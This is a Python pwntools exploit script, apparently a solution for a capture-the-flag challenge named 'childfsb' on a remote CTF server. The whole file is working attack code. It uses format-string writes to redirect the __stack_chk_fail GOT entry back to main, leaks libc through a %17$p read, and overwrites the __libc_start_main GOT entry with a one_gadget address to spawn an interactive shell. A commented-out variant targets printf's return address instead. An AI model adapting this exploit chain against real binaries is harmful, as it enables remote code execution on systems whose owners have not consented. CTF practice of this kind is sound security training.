#!/usr/bin/python 
from pwn import *
from koharin import *

context.log_level = 'debug'
p = remote("ctf.j0n9hyun.xyz", 3037)
#p = process("./childfsb")
elf = ELF("./childfsb")
#libc = ELF("./libc.so.6")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
one_gadget_off = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
main = elf.symbols['main']
stack_chk_fail_got = elf.got['__stack_chk_fail']
libc_start_main_got = elf.got['__libc_start_main']
libc_start_main_plt = elf.plt['__libc_start_main']

# offset 6

# _stack_chk_fail -> main && libc leak
pay = fsb64(6, stack_chk_fail_got, main & 0xffff, 1)
pay += 'A'*(0x19-len(pay))

p.sendafter("hello\n", pay)
pause()

pay = '%17$p'
pay += 'A'*(0x19-len(pay))

p.sendafter("hello\n", pay)


# libc leak
p.recvuntil("0x")
leak = int('0x' + p.recv(12), 16)
log.info("__libc_start_main+240 : "+hex(leak))
libcBase = leak - libc.sym['__libc_start_main'] - 240
log.info("libcBase : "+hex(libcBase))
one_gadget = libcBase + one_gadget_off[0]
log.info("one_gadget : "+hex(one_gadget))

pay = fsb64(6, libc_start_main_got, one_gadget, 1)
pay += 'A'*(0x19-len(pay))
p.sendafter("hello\n", pay)

pay = fsb64(6, libc_start_main_got+2, one_gadget >> 16, 1)
pay += 'A'*(0x19-len(pay))
p.sendafter("hello\n", pay)

pay = fsb64(6, stack_chk_fail_got, libc_start_main_plt, 1)
pay += 'A'*(0x19-len(pay))
p.sendafter("hello\n", pay)

'''
#gdb.attach(p)

#printf_ret leak
pay = '%19$p'
pay += 'A'*(0x19-len(pay))

p.sendafter("hello\n", pay)

leak2 = int(p.recv(14), 16)
log.info("leak2 : "+hex(leak2))
printf_ret = leak2 - 0xe8
log.info("printf_ret : "+hex(printf_ret))

# printf_ret -> one gadget
p.sendafter("hello\n", fsb64(6, printf_ret, one_gadget, 1))
p.sendafter("hello\n", fsb64(6, printf_ret+2, one_gadget >> 16, 1))
p.sendafter("hello\n", fsb64(6, printf_ret+4, one_gadget >> 32, 1))
'''

p.interactive()

